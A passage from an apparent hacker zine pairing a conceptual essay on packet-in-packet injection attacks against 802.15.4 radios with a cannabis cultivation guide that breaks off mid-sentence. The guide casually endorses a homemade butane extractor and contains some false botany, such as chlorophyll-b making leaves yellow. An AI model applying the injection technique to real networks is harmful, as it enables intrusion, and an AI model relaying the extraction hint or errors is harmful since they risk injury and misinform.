+
+=== A Packet Breaks Out ===
+
+On a cold and windy February 23rd of 2011, my illusions came to an
+abrupt end when I saw the payload bytes of an 802.15.4 frame's data
+--- transmitted inside a valid packet as a regular payload ---
+received as a frame of its own, reproducibly.
+
+The "inner" packet, which I believed to be safely contained within the
+belly of the enclosing frame would occasionally break out and arrive
+all by itself, without any sign of the encapsulating packet.
+
+Every once in a while, there was no whale, just Jonah. It was a very
+unwelcome miracle for someone who believed he could be safe from even
+SDR-wielding attackers inside a cozy Faraday cage, as long as his
+utopian gated community had no compromised nodes.
+
+Where was my encapsulation now? Where was my textbook's OSI model?
+
+Lies, all lies. Sweet illusions shattered by cruel Packet-in-Packet,
+the textbook illusion of neat encapsulation chief among them. How the
+books lied.
+
+=== Packet-in-Packet: a miracle explained ===
+
+The following is a typical structure of a digital radio frame
+as seen by the radio:
+
+------+----------+-----+-------------------------------+-----+------
+noise | preamble | SFD | L2 frame reported by sniffers | CRC | noise
+------+----------+-----+-------------------------------+-----+------
+
+The receiving radio uses the preamble bytes to synchronize itself, at
+the same time looking for SFD bytes digitally. Once a sequence of SFD
+bytes matches, the radio starts treating further incoming bytes as the
+content of the frame, saving them and feeding them into its checksum
+computation.
+
+Consider the situation when the "L2 payload bytes" transmitted after
+the SFD themselves contain the following, say, as a valid payload of
+a higher layer protocol:
+
+---------+-----+--------------------+--------------------------------
+preamble | SFD | inner packet bytes | valid checksum for inner packet
+---------+-----+--------------------+--------------------------------
+
+If the original frame's preamble and SFD are intact, all of the above
+will be received and passed on to the driver and the OS as regular
+payload bytes as intended.
+
+Imagine, however, that the original SFD is damaged by noise and missed
+by the radio. Then the initial bytes of the outer frame will be
+interpreted as noise, leading up to the embedded "preamble" and "SFD"
+of the would-be payload. Instead, these preamble and SFD will be taken
+to indicate an actual start of a real frame, and the "inner" packet
+will be heard, up to an including the valid checksum.  The following
+bytes of the enclosing frame will again be dismissed as noise, until
+another sequence of "preamble + SFD" is encountered.
+
+Thus, due to noise damaging the real SFD and the receiver's inability
+to tell noise bytes from payload bytes except by matching for an SFD,
+the radio will occasionally receive the inner packet -- precisely as
+if it were sent alone, deliberately.
+
+Thus a remote attacker capable of controlling the higher level
+protocol payloads that get transmitted over the air by one of the
+targeted radios on the targeted wireless network is essentially
+capable of occasionally injecting crafted Layer 1 frames -- without
+ever owning any radio or being near the targeted radios' physical
+location.
+
+Yes, Mallory, there is such a thing as Layer 1 wireless injection
+without a radio. No, Mallory, a mean, nasty Faraday cage will not
+spoil your holiday.
+
+=== The reality ===
+
+Designers of Layer 2 and above trust Layer 1 to provide valid or
+"authentic" objects (frames) across the layer boundary.  This trust is
+misplaced.
+
+There are two factors that likely contribute to it among network
+engineers and researchers who are not familiar with radio Layer 1
+implementations but have read driver and code in the layers above.
+
+Firstly, the use of the CRC-based checking throughout the OSI mode
+layers likely reinforces the faith in the ability of Layer 1 to detect
+errors -- any symbol errors that accidentally corrupt the encapsulated
+packet's structure while on the wire.
+
+Secondly, the rather complex parsing code required for Layer 2 and
+above to properly de-encapsulate respective payloads may lead its
+readers to believe that similarly complex algorithms take place in
+hardware or firmware in Layer 1.
+
+However, L1 implementations are neither validity, authenticity, or
+security filters, nor do they maintain complex enough state or context
+about the frame's bytes they are receiving.
+
+Aside from analog clock synchronization, their anatomy is nothing more
+than that of a finite automaton that pulls bytes (more precisely,
+symbols of the code that encodes the transmitted bytes, which differ
+per protocol, both in bits/symbol and in modulation) out of the air,
+continually.
+
+The inherently noisy RF medium produces a constant stream of symbols.
+The probability of hearing different symbols is actually non-uniform
+and depends on the details of modulation and encoding scheme, such as
+its error-correction.
+
+As it receives the symbol stream, this automaton continually compares
+a narrow window within the stream against the SFD sequence known to
+start a frame. Once matched by this shift register, the symbols start
+being accumulated in a buffer that will eventually be checksummed and
+passed to the Layer 2 drivers.
+
+Beyond the start-of-frame matching automation, the receiver has no
+other context to determine whether symbols are in-frame payload, our
+out-of-frame noise. It has no other concept of encapsulation or frame
+validity.  A digital radio is just a machine for pulling bytes out of
+the air.  It has weird machines in that same way -- and for the same
+reasons -- that a vulnerable C program has weird machines.
+
+Such encapsulation based on such a simple automaton is easily and
+frequently broken in presence of errors. All that is needed is for the
+chip's idea of the start-of-frame sequence -- typically, some of the
+preamble + a Start of Frame Delimiter, a.k.a. Sync, or just the
+latter where the preamble is used exclusively for analog
+synchronization -- to not match, for the subsequent payload bytes to be
+mistaken for the start-of-frame sequence or noise.
+
+In fact, to mislead the receiving automaton to the _intended meaning_
+of symbols (or bytes they are supposed to make up or come from) no
+crafting manipulation is necessary: the receiving machine is so simple
+that _random noise_ alone provides sufficient "manipulation" needed to
+confuse its state and allow for packet-in-packet injection.
+
+Thus injection for attackers without an especially cooperative radio
+or in fact any radio at all -- so long as the attacker can leverage
+some radio near the target to produce a predictable stream of symbols
+-- is enabled by broken encapsulation.
+
+=== What does this remind me of? ===
+
+I remember the first time I witnessed a buffer overflow exploit, when
+my Internet-facing Linux box, name Miskatonic, was exploited.  Whoever
+did that also opened a whole new world to me, and I'll be happy to
+repay that debt with a beer should we ever meet in person.
+
+At that time, I was a fairly competent C programmer, but I saw the
+world in terms of functions that called other functions.  Each of
+these functions returned after being called to whichever address it
+had been called from. I thought that the only way for a piece of code
+to ever get executed was to be inside a function called at some point.
+
+In other words, I regarded C functions as "atomic" abstractions.  Even
+though I implemented simple recursion and mutually recursive functions
+via my own stacks a few times, it never occurred to me that a real
+call stack could be anything other than a neat and perfect data
+structure with "push", "pop", and referencing of variable slots.
+
+Beware layers of abstractions. Take their expected, specified
+operation on faith, and they will appear real. It is tempting to trust
+a lower abstraction layer to provide _only_ the valid data structures
+your next layer expects to receive, to assume that the lower layer's
+designers already took responsibility for it. It is so tempting to
+limit your considerations to the detail and complexity of the layer
+you are working in.
+
+Thus the layers of abstraction become boundaries of competence.
+
+This temptation is overpowering on well-designed, abstraction-oriented
+environments, where you lack any legal or effective means of PEEK-ing
+or POKE-ing the underlying layers.  Dijkstra decried BASIC as a
+mind-mutilating language, but most real BASICs had PEEK and POKE to
+explore the actual RAM, and one sooner or later found himself
+wondering what they did. I wonder what Dijkstra would have said about
+Java, which entirely traps the mind of a programmer in its
+abstractions, with no hint of any other ways or idioms of programming.
+
+
+=== How we could have avoided falling for it ===
+
+The key to understanding this design problem is the incorrect
+assumptions about how input is handled, in particular, of how it is
+handled as a language, and the machine that handles it.
+
+The _language-theoretic approach_ to finding just such misconceptions
+and exploitable bugs based on it was developed by Len Sassaman
+and Meredith L. Patterson. Watch their talks [3,4] and look for
+upcoming papers at http://langsec.org
+
+Such a language-theoretic analysis at L1 would have revealed this
+immediately. Valid frames are phrases in the language of bytes that a
+digital radio continually pulls out of the air, and the L1 seen as an
+automaton for accepting valid phrases (frames) should reject
+everything else.
+
+The start-of-frame-delimiter matching functionality within the radio
+chip is just a shift register and a comparison circuit -- too simple
+an automaton, in fact, to guarantee anything about the validity of the
+frame. With this perspective, the misconception of L2 expecting frame
+encapsulation and validity becomes clear, almost trivial. The key to
+finding the vulnerability is in choosing this perspective.
+
+Conversely, there is no nicer source of 0-day than false assumptions
+about what is on the other side of an interface boundary of a
+textbook-blessed design. The convenient fiction of classic
+abstractions leads one to imagine a perfect and perfectly trustworthy
+machine on the other side, which takes care of serving up only the
+right kind of inputs to one's own layer. And so layers of abstraction
+become boundaries of competence.
+
+References:
+
+[1] Travis Goodspeed, Sergey Bratus, Ricky Melgares, Rebecca Shapiro, 
+    Ryan Speers, 
+   "Packets in Packets: Orson Welles' In-Band Signaling Attacks for 
+    Modern Radios", 
+    USENIX WOOT, August 2011,
+    http://www.usenix.org/events/woot11/tech/final_files/Goodspeed.pdf
+
+[2] Travis Goodspeed,
+    Remotely Exploiting the PHY Layer,
+    http://travisgoodspeed.blogspot.com/2011/09/
+      remotely-exploiting-phy-layer.html
+
+[3] Len Sassaman, Meredith L. Patterson,
+    "Exploiting the Forest with Trees",
+    BlackHat USA, August 2010,
+    http://www.youtube.com/watch?v=2qXmPTQ7HFM
+
+[4] Len Sassaman, Meredith L. Patterson,
+   "Towards a formal theory of computer insecurity: a language-theoretic 
+    approach"
+    Invited Lecture at Dartmouth College, March 2011,
+    http://www.youtube.com/watch?v=AqZNebWoqnc
+
+
+|=[ 0x07 ]=--=[ The 1130 Guide to Growing High-Quality Cannabis - 1130 ]-=|
+
+So you wanna grow marijuana? You wanna get high off your own buds?  Well
+this guide will surely teach you how. I'll assume you're already somewhat
+familiar with Mary-Jane, so I won't explain all the jargon in deep detail.
+
+
+Table of Contents
+
+0x00: General Botany -- basic plant knowledge
+0x01: Environment -- air, temperature, and humidity
+0x02: Container -- size and shape
+0x03: Water -- temperature and filtering
+0x04: Nutes -- plant food
+0x05: Conductivity and pH -- don't burn the roots
+0x06: Hydroponics -- how-to hydro
+0x07: Light -- which and why
+0x08: Cloning -- make 'em root
+0x09: Vegging -- big 'n' bushy
+0x0A: Flowering -- dense and dank
+0x0B: Harvest -- chop, dry, and cure
+0x0C: Extracts -- smoke, vape, and cook
+0x0D: Signs and Symptoms -- oh noes, wtf mang!
+
+
+
+0x00: General Botany
+
+If you've never grown before, growing cannabis can be difficult. Really
+though, it just depends on how much time you put in. As long as you check
+in on your plants 3-4 times a day, you'll begin to learn enough about them
+to grow some really dank buds. But to get you started, here are a few
+things you should know.
+
+Plants need light, water, air, and food to grow. A lack of any one of these
+at best will slow its growth and at worst will cause part or all of it to
+die. Light is generally the most limiting factor in determining a plant's
+growth rate, but that assumes all other factors are maxed. Plants absorb
+water and nutrients through their roots and carbon dioxide (CO2) through
+their leaves. They also need a bit of oxygen which they absorb through both
+leaves and roots.
+
+Chloryphyll is a chemical in their leaves that's used as a catylyst with
+energy from light to convert CO2 and water into sugars and oxygen.
+Chloryphyll-a is also what gives leaves their green color, while
+Chloryphyll-b is responsible for the yellow color of leaves.
+
+Plants need oxygen in order to burn energy to stay alive and grow, like we
+do, but plants produce much more oxygen than they consume. Plants are not
+able to move enough oxygen from the leaves down to the roots, so roots must
+have access to some oxygen in order to stay alive. When soil dries, air
+fills the space in the ground, and so soil must dry enough so that the
+roots can have air to breathe.
+
+Cannabis has two main kinds of roots. There are the taproots which can grow
+very large and persist through dryness, and there are the feeder hairs.
+Feeder hairs will not survive very long without water, but since the roots
+need air to breathe the soil must dry out enough between waterings. Thus,
+it is important to let soil dry enough so it is not wet but still retains
+enough moisture to keep the feeder hairs alive. If they die, they must grow
+back before the plant can begin absorbing more nutrients. An easy way to
+tell if the soil is properly dry is if the color is still dark (not a
+lighter brown as when the dirt is "bone-dry") but the soil does not stay
+clumped together as it does when wet.
+
+Plants require three macronutrients to survive: N-P-K, or Nitrogen
+(Nitrates), Phosphorus (Phosphates), and Potassium (Potash). Nitrogen is
+primarily responsible for the green color in vegetative matter. It is not
+as important in fruits and flowers. Phosphorus is needed for root growth
+and is also the primary nutrient for fruits and flowers. Potassium is used
+throughout the plant to provde support; more Potassium means stronger,
+stiffer stems and branches which provide better support for dense buds.
+
+
+0x01: Environment
+
+Although cannabis grows in pretty much any condition (it is a weed, after
+all), optimal conditions produce optimal growth rates. Certain strains may
+be more picky than others, but generally you want the following:
+
+Humidity
+ Cloning: 90-100%
+ Vegging: 50-80%
+ Flowering: 40-50%
+
+Temperature should always be 68-75F (20-24C). Lower temps increase
+humidity, and higher temps reduce humidity. Plants drink through their
+leaves as well as their roots, and they need humidity to do this. They also
+transpire through their leaves when temperatures are too high. Keep this in
+mind when checking your levels and diagnosing your plants. For instance, if
+the environment's been hotter than ideal and the air is dry, a small
+watering in between regular waterings may be necessary to protect the roots
+near the topsoil and prevent the plant from going into shock.
+
+Air flow is very important. Basically you want to see the leaves moving at
+all times. Proper air flow does two things: it moves the air right around
+the leaves so the plant always has access to CO2, and the continuous leaf
+movement causes the plant to react and grow stronger stems which you need
+to support those massively dense buds you wanna grow. Too much airflow
+isn't a big deal as long as the plants aren't falling over. Technically,
+moving air will reduce air pressure and thus temperature will drop
+slightly, so if heat is a problem for you consider keeping your fan on a
+higher setting. But the more air flow, the more the plants transpire, and
+the more water they'll need.
+
+
+0x02: Container
+
+Cannabis needs a proper container to provide optimal root growth. In shape,
+the best container is wider than it is tall. If growing outdoors, a raised
+bed of good soil does wonders. Indoors, wide pots or trays work very well.
+You'll need to decide if you want to grow in soil or a hydroponic medium.
+There are pros and cons to both. Soil with compost is ideal for outdoor
+organic growing -- after preparation nature helps keep the roots healthy,
+and with a good compost mix most of the time plain water is all that's
+needed. If growing in pots, soil is still a good choice, but you will
+definitely have to supplement the water with additional nutrients, or you
+can use dry fertilizers that you work into the topsoil.
+
+Indoor growing is much different than outdoor, and growing hydroponically
+adds a-whole-nother set of variables. If you're lazy, you have two options:
+grow in soil (soil is very forgiving), or build an automated setup. An
+automated setup is one that takes care of watering for you, so all you need
+to do is regular checkups, trimming, and checking on your reservoir.  I'll
+go into detail about different hydroponic setups later on.
+
+
+0x03: Water
+
+Yes, a whole section on water, albeit a short one. Water temperature should
+be a little less than air temperature, although the roots will tolerate
+pretty cold water. Never give your plants water that's less than 50F (10C);
+you'll risk shocking the roots and stunting growth for a few days.
+
+Water should be clean of excess salts, especially chlorine and chloramines.
+Soil gardens will tolerate the chlorines much better than hydro, but you
+should really get a water filter. A carbon filter is usually fine, but if
+your water source is really bad you might want to consider Reverse-Osmosis.
+RO filters are expensive, but they also reduce the conductivity of the
+water to the lowest possible levels, allowing you to add more nutrients
+without burning the roots. Carbon filters are pretty cheap, and you could
+even use a regular drinking water filter.
+
+
+0x04: Nutes
+
+I do love organic; there's nothing quite like the taste of organically
+grown buds, but I do find that synthetic nutrients give amazing results.
+If you're not growing for personal use, synthetics are cheaper and can give
+very high yields. Either way, I'd recommend using a premade blend made by a
+name-brand company -- when you're starting out it's just not worth trying
+to play chemist, just get the kit. I use liquid nutrients for both hydro
+and soil, but dry feeds will work in soil and any non-recirculating hydro
+setup (e.g. feed and drain in coco). Liquid nutrients are designed to be
+instantly accessible by the plants, whereas dry feeds are usually
+time-release.
+
+Here are some rough empirical NPKs:
+Cloning: 1-3-4
+Vegging: 3-2-4
+Flowering: 1-4-5
+
+Aside from Nitrogen, Phosphates, and Potash, plants also need
+micronutrients. Iron, Calcium, and Magnesium and at the top, with still
+many others required to proper growth. Most organic mixes will have these
+even though they won't specify on the bottle, but if you're growing with
+synthetics you will have to supplement. Molasses has Fe, Ca, and Mg, and
+the sugar content helps both feed microbials and rinse out the growing
+medium. Various Vitamin B-1 mixes will have most necessary micronutrients.
+Cal-Mag supplements are good too, but be aware when using in conjunction
+with molasses so you don't overfeed.
+
+In general, I recommend starting with less than half of the listed usage on
+the nutrient containers and then increasing as you see fit. It's a lot
+easier to see that your plants' leaves are a lighter green than you would
+want and then to increase the Veg mix than to use too much and burn your
+plants and have to start all over. If growing in soil, try starting at a
+quarter-strength and using it with every watering. Increase as necessary to
+compensate for light color and plant size.
+
+
+0x05: Conductivity and pH
+
+Soil/medium pH and water pH are measured differently, but as long as you
+regulate the water pH there's no reason to worry about the soil. If you can
+afford it, I highly recommend getting a pH/Conductivity meter; some also
+measure PPM (parts per million), though it's usually a conversion from
+conductivity (measures in milliSiemens). I don't even pay attention to the
+usage on the nutrient bottle anymore, but I fill my resevoir according to
+the conductivity. I find it to be much more accurate than measuring the
+volume of water in gallons and using measuring cups for nutrients.
+
+Required pH will depend entirely on your medium. In pure hydro/aero setups,
+this is 5.6-5.8 for veg and 5.8-6.0 for flowering. In coco coir, this is a
+bit higher: 6.0-6.2 for veg and 6.2-6.5 for flowering. In soil, it really
+depends on what's in the mix, but it usually ranges in 6.5-6.8 for veg and
+6.8-7.0 for flowering. Cloning should be in between the values for veg and
+flowering (5.8 for hydro, 6.2 for coco, and 6.8 for soil).
+
+pH mostly affects the nutrients that are available for the roots to absorb.
+The lower ranges increase nitrogen uptake, and the higher ranges increase
+phosphates. Since nitrogen is more important for veg and phosphate for
+flowering, this explains why the ranges are different for each phase. If pH
+varies by a point or two, it's not a big deal, but too strong in either
+direction can cause root-burn as well as deficiencies in both macro and
+micronutrients.
+
+Conductivity requirements depend on the age/size of the plant. I suggest
+starting with these maximums and steadily increasing for larger containers
+so long as no signs of problems occur: For soil/hydro: Cloning: 0.8/1.2 mS
+Vegging: 1.6/2.0 mS (containers up to 2 gallons) Flowering: 2.4/3.0 mS
+(containers up to 5 gallons)
+
+In general, conductivity >3.0 mS can be dangerous, so above that range only
+increase once/week and only 0.1-0.2 mS at a time.
+
+
+0x06: Hydroponics
+
+Hydro is awesome. Plants have the ability to grow continuously and at a
+very rapid pace, but they need extra care, and problems with nutrients or
+pH often occur so quickly that by the time you realize there's a problem
+it's usually too late. For first-timers, I'd recommend coco coir. If you're
+ambitious, consider building your own aeroponic system. In general, there
+are two types of systems: recirculating, and drain-to-waste. I'll list each
+medium and give some details about which system is appropriate. For
+recirculating, you'll want to drain and change your reservoir at least once
+a week in addition to topping it off regularly, whereas if using a
+drain-to-waste system only topping off is necessary.
+
+Coco coir:
+Coco coir is a part of the coconut husk that by itself can take years to
+break down, hence its designation as a hydroponic medium. It's commonly
+used as bedding for worms. It's highly absorbent and expands to sometimes
+five times its dry volume when wet. It also holds air very well. Coco coir
+is nice because it's very difficult to over-water your plants with it since
+it holds so much air, and the shrinking in between waterings adds
+additional air to the medium.  Drain-to-waste is best for coco because bits
+of the medium will also drain out, and you don't want these clogging up
+your pump or lines. Depending on the size of the container and plants, coco
+requires 1-3 feedings/day.
+
+Rockwool:
+Rockwool is woven fibers of rock made by Grodan. Rockwool is very
+absorbent, and it's easy to see when it is drying up. Like coco, rockwool
+is very porous and holds air very well. I prefer rockwool for cloning.  Ebb
+and flow (flood and drain, recirculating) or drain-to-waste both work well
+with rockwool. Fast growing plants may require up to 5-6 waterings/day
+depending on the size of medium. Timers come in handy here. For ebb and
+flow, flood for 10-15 minutes, then drain. For drain-to-waste, feed as
+needed, allowing 5-10% of the water feed to drain, ensuring complete
+saturation of the medium.
+
+Hydroton, Perlite, or other Pebbles:
+Hydroton is a manufactured expanded-clay medium. Perlite is a volcanic
+glass/rock, also expanded, and very porous. Both are better than filling a
+container with rocks/pebbles, although you could do that if you're really
+trying to save money. Hydroton and perlite do hold some water, but they
+drain very quickly and so should not be left without water for an extended
+period of time.
+Ebb and flow or continuous drip work well here. Drain-to-waste is very
+inefficient since the medium doesn't hold water for very long, and so very
+accurate timings would be needed to prevent excessive waste. If using a
+continuous drip, consider aerating the reservoir with an air pump to ensure
+roots have access to oxygen. For ebb and flow, flood at least 1-2 times per
+hour with no more than 15 minutes of dry time.
+
+Aeroponic
+Aeroponic growing is sweet. There's little-to-no chance of overwatering or
+underwatering (unless your pump breaks) as the roots always have access to
+water, nutrients, and air. For this, you'll need to contruct a sprayer
+assembly inside a reservoir. Rubbermaid containers are cheap and work well.
+cut 2" holes in the lid (or whatever size gasket you have) and fill the
+holes with cylindrical foam gaskets to hold the plants. Plant roots hang
+down freely into the reservoir. Construct the sprayer assembly using PVC
+piping and small 180- and 360-degree sprayers depending on placement.  The
+assembly should be as short as possible but have at least 2-3 inches above
+the pump and below the sprayers at the top. Use a submersible pump, and
+fill the reservoir to above the pump but below the sprayers. You will need
+an NFT (Nutrient Film Technique) style timer for the pump. These typically
+operate on cycles of 1 minute on and 4 minutes off or 3 minutes on and 5
+minutes off. I've seen cheap adjustable ones on Ebay. You can also make one
+yourself with an arduino and a relay pretty easily. Just make sure that the
+cycle allows for time in between sprayings to provide the roots access to
+air. An air pump here also works well.
+
+Deep Water Culture:
+DWC is simple, easy, and efficient. It's basically an aeroponic system but
+with a much deeper reservoir, allowing the roots to grow down into the
+nutrient solution. A sprayer system similar to the aeroponic one described
+above can be used, or a top-drip works as well. For a top-drip, fill a pot
+with Hydroton or another medium, and set the pump to continuously pump feed
+from the reservoir underneath to the pot on top. An aerator for the
+nutrient solution is necessary here so that roots hanging down into the
+solution have access to air.
+
+Aquaponic:
+When I first read about this I was blown away. Aquaponic combines hydro
+with an aquarium. Basically, you have a large reservoir with a DWC setup,
+but additionally you have fish living inside as well. The fish and plants
+eat each other's waste (just like in nature!), and they both feed on fish
+meal which is one of the most common organic plant foods. Guppies are
+usually the best choice for fish since they're cheap and reproduce quickly,
+although any freshwater fish will work.
+
+
+0x07: Light
+
+Light is arguably the most important factor in growing. Typically it is the
+most limiting factor. There are many different types of lights, and each
+has its own benefits. Halogen lights are most common in professional grows,
+fluorescents are cheap and efficient, and LEDs are gaining popularity.
+Here's some info on each:
+
+Good ol' incandescents:
+These provide light, they sure do, but they also provide heat. They're best
+used as supplemental light when you need the added heat as well, otherwise
+just go with a fluorescent.
+
+Fluorescents:
+Fluorescents come in many sizes, shapes, and spectrums. Spectrum is rated
+by color temperature in Kelvins. A 6500K light is usually recommended as it
+provides the closest spectrum to the Sun's white light. In general, the
+higher the K, the better. Fluorescents are great for all phases of growth,
+but they're best suited for clones, mothers, and vegetative plants when you
+have an HPS available for flowering. Even so, they're always great to
+consider as supplementals since they're so cheap and efficient.
+
+Metal-Hallides:
+MH Halogens are extremely effective for the vegetative phase. They work for
+flowering as well, but are not as effective as HPS lights. A 400-watt MH
+can cover a 3x3ft area, 600-watt covers 4x4', and 1000-watt covers 6x6'.
+Of course, additional light is nice.
+
+High-Pressure Sodium:
+HPS lights are best for flowering. They have a spectrum more concentrated
+in the red/yellow end which plants tend to absorb more during the autumn
+season (when flowering). In every test I've ever seen, HPS lights
+outperform all other lights in flowering production, watt for watt (or
+lumen-equivalent in the case of LEDs and fluorescents). HPS lights also
+generate a lot of heat, so keep that in consideration.
+
+LEDs:
+LED lights are extremely efficient, but they're also expensive. In the long
+run, they're worth it, but they can take a few cycles to pay themselves
+off. LEDs come in combinations of red and blue (more red for flowering),
+and sometimes other colors are added as well. If space permits, I'd still
+recommend using an HPS along with LEDs for flowering, but LEDs are great
+for the vegetative phase.
+
+With all lights, the inverse-square law applies, meaning if you cut the
+distance from light to plant in half, you quadruple the light received, and
+vice versa, if you double the distance you quarter the light received. Too
+much light can be a bad thing. Plants that are too small or do not have
+enough water/nutrients to use will not be able to use all the light that
+hits them and their leaves will burn. Also, there are areas close to the
+lights that are called hotspots. These are areas where reflected light is
+concentrated, and plants in these spots are more likely to burn since the
+light there is very intense. The rule-of-thumb is use your hand: if it's
+too hot for you, it's too hot for the plants.
+
+
+0x08: Cloning
+
+Cloning is the process of taking cuttings from a "mother" and allowing
+these cuttings to root into plants of their own. In addition to your mother
+plant, you'll need a sharp pair of snips, a humidity dome, cloning medium,
+filtered water, cloning gel/powder (optional), nutrients (optional but
+recommended), and a light that will be on 24-hours/day (a single
+fluorescent is sufficient). Here is a step-by-step process:
+
+Prepare your mothers by giving them plain water (along with a flushing
+solution if you like, a bit of molasses works well) at least a day before
+cutting clones. This helps flush out excess Nitrogen so that the clones can
+root more quickly.
+
+Prepare the cloning solution.  This can be plain water, but I like to add a
+mix of flowering nutrients (better than vegging nutrients for rooting,
+nitrogen is bad for cloning) and kelp and algae extracts. Balance the pH of
+the solution according to the medium you're using, and throoughly soak the
+medium.  I use rockwool. Other alternatives are Groplugs, Coco, and soil.
+Any growing medium can work, really.I also like to keep a pool of solution
+in the bottom tray of the humidity dome to help keep the humidity high as
+well as provide food for the plants once they root. You can even allow the
+medium to soak for the first 3-4 days of cloning to help speed up root
+growth, just be sure to drain it after that.
+
+Cut the clones. I've cut both small and tall clones, and the small ones
+work very well too. Leave at least 2" (about 5cm) of stem underneath the
+highest leaves. You can trim leaves off to save space, if you want. This
+allows you to pack more clones inside the dome. Otherwise, I like to leave
+the leaves on (except for the bottom section that's inside the medium). You
+can place the clone directly in the medium, or you can shave and split the
+bottom. Splitting the bottom of the stem and shaving off the outer-layer of
+the bottom of the stem increases the surface area of the cambium layer,
+kind of like a stemcell layer. From here is where the roots grow. Exposing
+more can increase the rooting time by a few days, but often you will get
+much more vigorous root growth. I prefer this method.
+
+Dip the stem tip in cloning gel/powder, if you're using it (I don't), then
+plant the clones inside the medium, and cover the dome. If cutting many
+clones, I like to keep the dome partially covered (for those already
+planted) so they don't start wilting right away.
+
+After they're all planted and the dome is covered, place the dome under a
+light that will be on 24-hours/day. Clones need very little light to root,
+so a single fluorescent is sufficient here, or just some ambient light that
+will not be shut off.
+
+Clones can take anywhere from 5-14 days to root depending on the factors
+discussed above. I like to keep my clones rooting in the dome until their
+root masses are about a foot long, though the plants will still be short.
+This ensures the best chance of avoiding shock when transplanting as well
+as fairly explosive growth within a couple days of transplanting.
+
+
+0x09: Vegging
+
+Once clones have rooted, the vegetative phase begins. Most strains require
+at least 18 hours of light/day to prevent them from flowering, though some
+make require more, up to 24 hours/day. This is the easiest phase to grow in
+since the plants are vigorous and large enough to tolerate shock.
+
+Transplant your clones into the medium of your choice, and begin feeding a
+mild nutrient solution. For soil gardens, plain water can be used for the
+first week. Increase the concentration of the nutrient solution over time
+to accomodate the size of the plant. Consider transplanting to a larger
+container after two weeks of continuous, vigorous growth.
+
+Depending on your setup, you'll want a different target size of your veg
+plants. A sea of green, for instance, requires many plants next to each
+other so that they basically form a horizontal plane across their tops, but
+if you're growing in a small closet with 2-3 plants then you'll probably
+want them as big as they can fit.
+
+There are different stress-techniques used to promote larger growth.
+Topping is one of the most common. Topping entails cutting off the newest
+growth of the highest node, generally without trimming much of the larger
+leaf matter. Topping forces the plant's vascular system to merge at this
+point, causing more growth nodes to be produced here at the top of the
+plant. Topping is a preferred method because the top buds of each branch
+are generally the largest, and more top nodes mean more top nugs.
+
+Another technique used is bending. Bending entails taking the tallest
+branch of the plant and bending it down and to the side, usually tying it
+down with gardening wire or string. Bending exposes more of the lower nodes
+to direct light, causing them to grow larger. It also allows more buds to
+receive direct light, making it another preferred method by many growers.
+
+Creasing and snapping branches are a form of "supercropping", and they
+combine the benefits of topping and bending. The idea is to break the inner
+part of a branch while keeping it attached to the plant. Lke topping, this
+causes a merging of the vascular system, and this section of branch later
+on will grow into a nice bulge. And like bending, the top nodes are pushed
+outward to allow more light to hit nodes underneath. It is usually best to
+bandage the plant after supercropping until it has completely healed since
+this technique can cause a good deal of damage to the plant if left
+unattended. It's usually best to delay flowering for a couple of weeks
+after supercropping to allow the plant to fully heal and build support for
+those super dank buds it'll be growing.
+
+
+0x0A: Flowering
+
+Once your plant has reached the desired size, it's time for flowering.
+Unless you're growing an autoflowering variety, the flowering cycle is
+typically triggered by a change in nighttime length, and most often a
+12-hour day/12-hour night cycle is used. Some plants will grow considerably
+during the flowering phase, especially the African Sativas, so keep this in
+mind; you don't want to trim the plant once it's in full flower production
+as this causes considerable stress and can cause the female to produce some
+seeds.
+
+For the first couple weeks of flowering, convert about half of your
+nutrient solution from the veg mix to the flower mix. Convert more to
+flowering as time passes. After 2-3 weeks, a pure flowering mix should be
+used. Once the mass of pistils have formed, increase the nutrient
+concentration. Large, dense buds will develop, and some leaves may yellow
+and drop. Toward the end of the cycle, pistils will change color (often
+from white to orange/brown), and from here on consider flushing with plain
+water. Flushing leaches leftover fertilizer from inside the plant, giving
+it a much smoother burn. Plants that are harvested without flushing
+typically will have harsh smoke, even after curing.
+
+At the end of the flowering phase, the crystals on the buds, pistils,
+leaves, and stems will first turn milky-white. After this, they begin to
+brown. This is when they are ready to pick. Picking later will bring out
+more of the Indica characteristics (more CBD/CBN), whereas picking earlier
+will bring out more of the Sativa characteristics (more THC). Picking too
+early, however, (before crystals have become milky-white) produces weak
+buds, and often will just give you a headache when smoked.
+
+If after flushing the crystals do not appear to change color, feed them
+once more, with a full, strong solution, then continue flushing.
+Additional buds will likely grow, and they will be ready soon after.
+
+
+0x0B: Harvest
+
+Harvest the plants by cutting at the base, then hang them upside-down (I
+dare you to try hanging them right-side up....good luck) in a dark room to
+dry. A small amount of airflow is necessary, so keep a fan on low but not
+pointed directly at the plants. After at least one day of full darkness,
+you can begin trimming. Trim off all the largest leaf first, leaving the
+smaller, hashy leaves for manicuring later. If this trim does not have
+crystals/hash on it, discard it, otherwise save for extracts.
+
+Manicuring is a bit of a longer process. You can go the quick route, and
+just trim the ends of the leaves sticking out like so many lazy-ass growers
+do, or you can properly manicure your buds, making them look better and
+preventing you from smoking all that leaf matter. To manicure, use a pair
+of floral trimmers to reach in and cut the leaves at the base of the stem.
+This is uaully easier then holding the buds upside down since the leaves
+are below the buds. It takes practice and patience to avoid clipping off
+whole buds, but even if you do just save them along with the other
+manicured buds. After the leaf is clipped off, remove excess stem.  If the
+stems fold when you try to break them, the buds are not dry yet; place them
+in a brown paper bag for further drying. Once they snap, place them in
+glass jars for curing. Also, save all the trim from manicuring for making
+extracts. You can place it in a ziploc bag and put it in the freezer until
+you're ready to make extracts.
+
+Check on the glass jars once a day. Open each jar, and take a whiff. You'll
+notice over time how the smell changes. Check out the buds. Try snapping a
+stem. If it folds, either put the buds back in a paper bag, or keep the jar
+open a bit longer. For a quick, 2-week cure, keep jars open 15-60 minutes
+per day depending on dryness. If buds are dry, don't leave the jar open too
+long, but open it at least once a day to allow the air inside to exchange.
+
+During the curing process, chemicals inside the buds break down, mainly
+those that cause harsh smoke. The longer the cure, the smoother the smoke
+is, but I can't say that anything longer than 8 weeks really makes a
+difference. Once the buds smell like they have cured, try smoking it.
+Continue the curing process until the smoke is smooth and clean.
+
+
+0x0C: Extracts
+
+Now here's the fun part. Personally, I like making kief, hash, and baked
+goods. Butane extracts are also pretty easy. I won't go into detail on
+those, but making a butane extractor with PVC and a lighter refill can is
+simple, and there are plenty of guides available online.
+
+If you want to make butter or oil for cooking, you can use kief or hash
+you've already made and not worry about filtering, or you can use the trim
+in its entirety. If using trim, fill a pot with the amount of butter or oil
+you want to make. Add just enough water to the pot so that it won't splash
+or boil over, but otherwise more water doesn't hurt. Mix it all together,
